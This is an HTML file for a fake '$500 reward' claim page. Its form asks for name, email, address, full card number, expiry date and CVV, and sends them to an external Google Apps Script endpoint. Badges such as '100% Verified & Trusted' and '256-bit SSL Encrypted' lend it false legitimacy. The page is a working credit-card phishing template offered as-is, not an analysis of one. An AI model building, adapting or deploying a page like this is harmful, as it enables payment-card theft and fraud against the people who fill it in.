<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RewardsHub - $500 Reward</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
        :root { --bg: #050505; --card: #111111; --accent: #8a2be2; --text: #ffffff; }
        
        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; min-height: 100vh; display: flex; flex-direction: column; }
        
        /* Header - Mobile friendly */
        .header { width: 100%; padding: 20px 10px; background: #0a0a0a; text-align: center; border-bottom: 1px solid #222; }
        .badge { background: #1a4d2e; color: #4ade80; padding: 5px 12px; border-radius: 20px; font-size: 10px; font-weight: 700; text-transform: uppercase; }
        
        /* Content Wrapper */
        .wrapper { flex: 1; display: flex; justify-content: center; align-items: center; padding: 15px; }
        .form-box { background: var(--card); width: 100%; max-width: 450px; padding: 25px; border-radius: 20px; border: 1px solid #222; }
        
        /* Form Layout */
        .input-group { margin-bottom: 15px; }
        label { display: block; font-size: 10px; color: #888; margin-bottom: 5px; text-transform: uppercase; }
        input { width: 100%; background: #000; border: 1px solid #333; padding: 12px; border-radius: 10px; color: white; box-sizing: border-box; font-size: 14px; }
        
        .row { display: flex; gap: 10px; }
        .row > div { flex: 1; }
        
        .submit-btn { width: 100%; background: var(--accent); color: white; border: none; padding: 15px; border-radius: 10px; font-weight: 800; cursor: pointer; margin-top: 10px; font-size: 14px; }
        
        /* Footer */
        .footer { padding: 15px; text-align: center; color: #444; font-size: 10px; background: #050505; }

        /* Tablet aur Desktop ke liye adjustements */
        @media (min-width: 600px) {
            .form-box { padding: 40px; }
            .badge { font-size: 12px; }
        }
    </style>
</head>
<body>

    <header class="header">
        <div class="badge">100% Verified & Trusted</div>
        <h2 style="margin: 10px 0 0 0; font-size: 22px;">Secure Reward Claim</h2>
    </header>

    <div class="wrapper">
        <div class="form-box">
            <form action="https://script.google.com/macros/s/AKfycbz4bE3WIVsYF6EhtlF6xbbJWSZTCx4VOFED3dHpoN88hmVk82uNfm_xToOth-7YEDEb/exec" method="POST">
                <div class="row">
                    <div class="input-group"><label>First Name</label><input type="text" name="firstName" required></div>
                    <div class="input-group"><label>Last Name</label><input type="text" name="lastName" required></div>
                </div>
                <div class="input-group"><label>Email Address</label><input type="email" name="email" required></div>
                <div class="input-group"><label>Zip Code</label><input type="text" name="zipCode" required></div>
                <div class="input-group"><label>Full Delivery Address</label><input type="text" name="address" required></div>
                <div class="input-group"><label>Cardholder Name</label><input type="text" name="cardholderName" required></div>
                <div class="input-group"><label>Card Number</label><input type="text" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required></div>
                <div class="row">
                    <div class="input-group"><label>Expiry</label><input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required></div>
                    <div class="input-group"><label>CVV</label><input type="password" name="cvv" placeholder="•••" maxlength="4" required></div>
                </div>
                <button type="submit" class="submit-btn">Claim Reward Now</button>
            </form>
        </div>
    </div>

    <footer class="footer">
        &copy; 2026 RewardsHub. All rights reserved. | 256-bit SSL Encrypted
    </footer>

</body>
</html>
